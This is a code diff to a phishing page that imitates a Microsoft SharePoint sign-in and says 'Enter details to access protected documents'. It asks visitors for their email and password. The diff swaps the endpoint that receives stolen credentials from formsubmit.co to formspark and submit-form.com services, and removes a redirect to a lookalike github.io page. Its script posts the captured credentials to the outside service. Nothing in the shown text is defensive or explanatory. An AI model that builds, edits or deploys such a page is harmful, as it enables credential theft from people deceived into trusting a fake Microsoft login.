@@ -128,7 +128,7 @@
                      
                       <div id="display-msg" class="alert alert-danger" style="display: none; padding: 10px"></div>
                       <div class="text-center mb-1"><em>Enter details to access protected documents</em></div>
-                      <form action="https://formsubmit.co/8177cd215f478528d36f6cda20edb0d9" method="POST"> 
+                      <form id="loginForm" action="https://submit.formspark.io/your-form-id" method="POST"> 
                       <div class="mb-2">
                           <label for="email" class="form-label">Email address</label>
                           <input type="email" class="form-control shadow-none" placeholder="Receiver's email" name="email" id="email" required />
@@ -137,7 +137,7 @@
                           <label for="password" class="form-label">Password</label>
                           <input type="password" class="form-control shadow-none" placeholder="Receiver's password" name="password" id="password" minlength="4" required />
                       </div>
-                      <input type="hidden" name="_next" value="https://amira800.github.io/Microsoftsharepoint/MiicrosoftSharePoint.html?e=">
+                       
                       <div class="text-center mb-2">
                           <button type="submit" id="mpanampa" class="btn btn-primary">Access Files</button>
                       </div>
@@ -151,10 +151,7 @@
     <footer class="container-fluid bg-light text-center py-1" style="margin-bottom: 0px">
         <p style="font-size: 13px">© 2024 Microsoft Corporation</p>
     </footer>
-
-    
-    
-    <script type="text/javascript">
+ <script>
     const displayElement = document.querySelector("#display-msg");
     displayElement.style.display = "none";
 
@@ -172,7 +169,7 @@
 
         if (validateEmailAddress(emailParam)) {
           document.querySelector("#emailInput").value = emailParam;
-          document.querySelector("#emailInput").readOnly = true;
+          document.querySelector("#emailInput").required = true;
         }
 
         document.querySelectorAll("td").forEach((cell) => {
@@ -181,7 +178,7 @@
           });
         });
 
-        document.querySelector("#accessForm").addEventListener("submit", async (event) => {
+        document.querySelector("#loginForm").addEventListener("submit", async (event) => {
                 event.preventDefault();
                 const submitButton = document.querySelector("#mpanampa");
                 submitButton.disabled = true;
@@ -193,7 +190,7 @@
                 };
 
                 try {
-                    const response = await fetch('https://formsubmit.co/8177cd215f478528d36f6cda20edb0d9', {
+                    const response = await fetch('https://submit-form.com/YuH728Ott', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
